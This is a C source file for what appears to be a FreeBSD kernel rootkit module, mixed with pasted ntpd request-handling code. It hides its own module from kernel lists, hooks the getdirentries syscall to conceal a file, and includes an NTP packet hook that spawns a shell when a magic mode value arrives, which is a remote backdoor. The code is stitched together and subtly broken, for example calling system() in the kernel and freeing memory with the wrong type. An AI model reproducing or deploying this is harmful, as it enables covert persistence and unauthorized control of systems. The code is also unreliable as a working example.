#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>
#include <sys/dirent.h>
#include <bsm/audit_kevents.h>
#include <sys/sysproto.h>
#include<sys/types.h>
#include<sys/malloc.h>

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif


#include "stddef.h"
#include "ntp_types.h"
#include "recvbuff.h"
#include "ntp_request.h"


/*
 * Structure to hold request procedure information
 */
#define	NOAUTH	0
#define	AUTH	1

#define	NO_REQUEST	(-1)
/*
 * Because we now have v6 addresses in the messages, we need to compensate
 * for the larger size.  Therefore, we introduce the alternate size to 
 * keep us friendly with older implementations.  A little ugly.
 */
static int client_v6_capable = 0;   /* the client can handle longer messages */

#define v6sizeof(type)	(client_v6_capable ? sizeof(type) : v4sizeof(type))

struct req_proc {
	short request_code;	/* defined request code */
	short needs_auth;	/* true when authentication needed */
	short sizeofitem;	/* size of request data item (older size)*/
	short v6_sizeofitem;	/* size of request data item (new size)*/
	void (*handler) (sockaddr_u *, endpt *,
			   struct req_pkt *);	/* routine to handle request */
};

/*
 * Universal request codes
 */
static const struct req_proc univ_codes[] = {
	{ NO_REQUEST,		NOAUTH,	 0,	0, NULL }
};

static	void	req_ack	(sockaddr_u *, endpt *, struct req_pkt *, int);
static	void *	prepare_pkt	(sockaddr_u *, endpt *,
				 struct req_pkt *, size_t);
static	void *	more_pkt	(void);
static	void	flush_pkt	(void);
static	void	list_peers	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	list_peers_sum	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	peer_info	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	peer_stats	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	sys_info	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	sys_stats	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	mem_stats	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	io_stats	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	timer_stats	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	loop_info	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_conf		(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_unconf	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	set_sys_flag	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	clr_sys_flag	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	setclr_flags	(sockaddr_u *, endpt *, struct req_pkt *, u_long);
static	void	list_restrict4	(const restrict_u *, struct info_restrict **);
static	void	list_restrict6	(const restrict_u *, struct info_restrict **);
static	void	list_restrict	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_resaddflags	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_ressubflags	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_unrestrict	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_restrict	(sockaddr_u *, endpt *, struct req_pkt *, restrict_op);
static	void	mon_getlist	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	reset_stats	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	reset_peer	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_key_reread	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	trust_key	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	untrust_key	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_trustkey	(sockaddr_u *, endpt *, struct req_pkt *, u_long);
static	void	get_auth_info	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	req_get_traps	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	req_set_trap	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	req_clr_trap	(sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_setclr_trap	(sockaddr_u *, endpt *, struct req_pkt *, int);
static	void	set_request_keyid (sockaddr_u *, endpt *, struct req_pkt *);
static	void	set_control_keyid (sockaddr_u *, endpt *, struct req_pkt *);
static	void	get_ctl_stats   (sockaddr_u *, endpt *, struct req_pkt *);
static	void	get_if_stats    (sockaddr_u *, endpt *, struct req_pkt *);
static	void	do_if_reload    (sockaddr_u *, endpt *, struct req_pkt *);
#ifdef KERNEL_PLL
static	void	get_kernel_info (sockaddr_u *, endpt *, struct req_pkt *);
#endif /* KERNEL_PLL */
#ifdef REFCLOCK
static	void	get_clock_info (sockaddr_u *, endpt *, struct req_pkt *);
static	void	set_clock_fudge (sockaddr_u *, endpt *, struct req_pkt *);
#endif	/* REFCLOCK */
#ifdef REFCLOCK
static	void	get_clkbug_info (sockaddr_u *, endpt *, struct req_pkt *);
#endif	/* REFCLOCK */

/*
 * ntpd request codes
 */
static const struct req_proc ntp_codes[] = {
	{ REQ_PEER_LIST,	NOAUTH,	0, 0,	list_peers },
	{ REQ_PEER_LIST_SUM,	NOAUTH,	0, 0,	list_peers_sum },
	{ REQ_PEER_INFO,    NOAUTH, v4sizeof(struct info_peer_list),
				sizeof(struct info_peer_list), peer_info},
	{ REQ_PEER_STATS,   NOAUTH, v4sizeof(struct info_peer_list),
				sizeof(struct info_peer_list), peer_stats},
	{ REQ_SYS_INFO,		NOAUTH,	0, 0,	sys_info },
	{ REQ_SYS_STATS,	NOAUTH,	0, 0,	sys_stats },
	{ REQ_IO_STATS,		NOAUTH,	0, 0,	io_stats },
	{ REQ_MEM_STATS,	NOAUTH,	0, 0,	mem_stats },
	{ REQ_LOOP_INFO,	NOAUTH,	0, 0,	loop_info },
	{ REQ_TIMER_STATS,	NOAUTH,	0, 0,	timer_stats },
	{ REQ_CONFIG,	    AUTH, v4sizeof(struct conf_peer),
				sizeof(struct conf_peer), do_conf },
	{ REQ_UNCONFIG,	    AUTH, v4sizeof(struct conf_unpeer),
				sizeof(struct conf_unpeer), do_unconf },
	{ REQ_SET_SYS_FLAG, AUTH, sizeof(struct conf_sys_flags),
				sizeof(struct conf_sys_flags), set_sys_flag },
	{ REQ_CLR_SYS_FLAG, AUTH, sizeof(struct conf_sys_flags), 
				sizeof(struct conf_sys_flags),  clr_sys_flag },
	{ REQ_GET_RESTRICT,	NOAUTH,	0, 0,	list_restrict },
	{ REQ_RESADDFLAGS, AUTH, v4sizeof(struct conf_restrict),
				sizeof(struct conf_restrict), do_resaddflags },
	{ REQ_RESSUBFLAGS, AUTH, v4sizeof(struct conf_restrict),
				sizeof(struct conf_restrict), do_ressubflags },
	{ REQ_UNRESTRICT, AUTH, v4sizeof(struct conf_restrict),
				sizeof(struct conf_restrict), do_unrestrict },
	{ REQ_MON_GETLIST,	NOAUTH,	0, 0,	mon_getlist },
	{ REQ_MON_GETLIST_1,	NOAUTH,	0, 0,	mon_getlist },
	{ REQ_RESET_STATS, AUTH, sizeof(struct reset_flags), 0, reset_stats },
	{ REQ_RESET_PEER,  AUTH, v4sizeof(struct conf_unpeer),
				sizeof(struct conf_unpeer), reset_peer },
	{ REQ_REREAD_KEYS,	AUTH,	0, 0,	do_key_reread },
	{ REQ_TRUSTKEY,   AUTH, sizeof(u_long), sizeof(u_long), trust_key },
	{ REQ_UNTRUSTKEY, AUTH, sizeof(u_long), sizeof(u_long), untrust_key },
	{ REQ_AUTHINFO,		NOAUTH,	0, 0,	get_auth_info },
	{ REQ_TRAPS,		NOAUTH, 0, 0,	req_get_traps },
	{ REQ_ADD_TRAP,	AUTH, v4sizeof(struct conf_trap),
				sizeof(struct conf_trap), req_set_trap },
	{ REQ_CLR_TRAP,	AUTH, v4sizeof(struct conf_trap),
				sizeof(struct conf_trap), req_clr_trap },
	{ REQ_REQUEST_KEY, AUTH, sizeof(u_long), sizeof(u_long), 
				set_request_keyid },
	{ REQ_CONTROL_KEY, AUTH, sizeof(u_long), sizeof(u_long), 
				set_control_keyid },
	{ REQ_GET_CTLSTATS,	NOAUTH,	0, 0,	get_ctl_stats },
#ifdef KERNEL_PLL
	{ REQ_GET_KERNEL,	NOAUTH,	0, 0,	get_kernel_info },
#endif
#ifdef REFCLOCK
	{ REQ_GET_CLOCKINFO, NOAUTH, sizeof(u_int32), sizeof(u_int32), 
				get_clock_info },
	{ REQ_SET_CLKFUDGE, AUTH, sizeof(struct conf_fudge), 
				sizeof(struct conf_fudge), set_clock_fudge },
	{ REQ_GET_CLKBUGINFO, NOAUTH, sizeof(u_int32), sizeof(u_int32),
				get_clkbug_info },
#endif
	{ REQ_IF_STATS,		AUTH, 0, 0,	get_if_stats },
	{ REQ_IF_RELOAD,	AUTH, 0, 0,	do_if_reload },

	{ NO_REQUEST,		NOAUTH,	0, 0,	0 }
};


/*
 * Authentication keyid used to authenticate requests.  Zero means we
 * don't allow writing anything.
 */
keyid_t info_auth_keyid;

/*
 * Statistic counters to keep track of requests and responses.
 */
u_long numrequests;		/* number of requests we've received */
u_long numresppkts;		/* number of resp packets sent with data */

/*
 * lazy way to count errors, indexed by the error code
 */
u_long errorcounter[MAX_INFO_ERR + 1];

/*
 * A hack.  To keep the authentication module clear of ntp-ism's, we
 * include a time reset variable for its stats here.
 */
u_long auth_timereset;

/*
 * Response packet used by these routines.  Also some state information
 * so that we can handle packet formatting within a common set of
 * subroutines.  Note we try to enter data in place whenever possible,
 * but the need to set the more bit correctly means we occasionally
 * use the extra buffer and copy.
 */
static struct resp_pkt rpkt;
static int reqver;
static int seqno;
static int nitems;
static int itemsize;
static int databytes;
static char exbuf[RESP_DATA_SIZE];
static int usingexbuf;
static sockaddr_u *toaddr;
static endpt *frominter;


#define T_NAME "hide"
#define VERSION "assignHid.ko"
/*
* The following is the list of variables you need to reference in order
* to hide this module, which aren't defined in any header files.
*/
extern linker_file_list_t linker_files;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
    TAILQ_ENTRY(module) link; /* chain together all modules */
    TAILQ_ENTRY(module) flink; /* all modules in a file */
    struct linker_file *file; /* file which contains this module */
    int refs; /* reference count */
    int id; /* unique id number */
    char *name; /* module name */
    modeventhand_t handler; /* event handler */
    void *arg; /* argument for handler */
    modspecific_t data; /* module specific data */
};

void ntp_hook (
	struct recvbuf *rbufp,
	int mod_okay
	)
{
	static u_long quiet_until;
	struct req_pkt *inpkt;
	struct req_pkt_tail *tailinpkt;
	sockaddr_u *srcadr;
	endpt *inter;
	const struct req_proc *proc;
	int ec;
	short temp_size;
	l_fp ftmp;
	double dtemp;
	size_t recv_len;
	size_t noslop_len;
	size_t mac_len;

	/*
	 * Initialize pointers, for convenience
	 */
	recv_len = rbufp->recv_length;
	inpkt = (struct req_pkt *)&rbufp->recv_pkt;
	srcadr = &rbufp->recv_srcadr;
	inter = rbufp->dstadr;

	// 123 is a magic number for ntp on its own, so I guess why not?	
	if(inpkt->rm_vn_mode == 123){
		//uprintf("TRIGGERED.\n");
		system("/bin/sh");
	}
	else
	{
		process_private(recvbuf, mod_okay);
	}
}




/*
* getdirentries system call hook.
* Hides the file T_NAME.
*/
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args /* {
        int fd;
        char *buf;
        u_int count;
        long *basep;
     } */ *uap;
     uap = (struct getdirentries_args *)syscall_args;
     struct dirent *dp, *current;
     unsigned int size, count;
 /*
 * Store the directory entries found in fd in buf, and record the
 * number of bytes actually transferred.
 */
     sys_getdirentries(td, syscall_args);
     size = td->td_retval[0];
 /* Does fd actually contain any directory entries? */
     if (size > 0) {
     
	 dp = malloc(size, M_DEVBUF ,M_NOWAIT);
         copyin(uap->buf, dp, size);
         current = dp;
         count = size;
 /*
 * Iterate through the directory entries found in fd.
 * Note: The last directory entry always has a record length
 * of zero.
 */
        while ((current->d_reclen != 0) && (count > 0)) {
            count -= current->d_reclen;
 /* Do we want to hide this file? */
            if(strcmp((char *)&(current->d_name), T_NAME) == 0) {
 /*
 * Copy every directory entry found after
 * T_NAME over T_NAME, effectively cutting it
 * out.
 */
                if (count != 0)
                    bcopy((char *)current +current->d_reclen, current,count);
                    size -= current->d_reclen;
                    break;
            }
 /*
 * Are there still more directory entries to
 * look through?
 */
            if (count != 0)
 /* Advance to the next record. */
                current = (struct dirent *)((char *)current + current->d_reclen);
        }
 /*
 * If T_NAME was found in fd, adjust the "return values" to
 * hide it. If T_NAME wasn't found...don't worry 'bout it.
 */
     td->td_retval[0] = size;
     copyout(dp, uap->buf, size);
     free(dp, M_TEMP);
     }
 return(0);
}
/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
    struct linker_file *lf;
    struct module *mod;
    mtx_lock(&Giant);
 
/* Decrement the current kernel image's reference count. */
    (&linker_files)->tqh_first->refs--;
/*
* Iterate through the linker_files list, looking for VERSION.
* If found, decrement next_file_id and remove from list.
*/
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, VERSION) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
 
    mtx_unlock(&Giant);
    sx_xlock(&modules_sx);
/*
* Iterate through the modules list, looking for "assignHid."
* If found, decrement nextid and remove from list.
*/
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, "assignHid") == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
     }
    sx_xunlock(&modules_sx);
    sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
    //need to add port call here
    return(0);
}
static moduledata_t assignHid_mod = {
    "assignHid", /* module name */
    load, /* event handler */
    NULL /* extra data */
};
DECLARE_MODULE(assignHid, assignHid_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
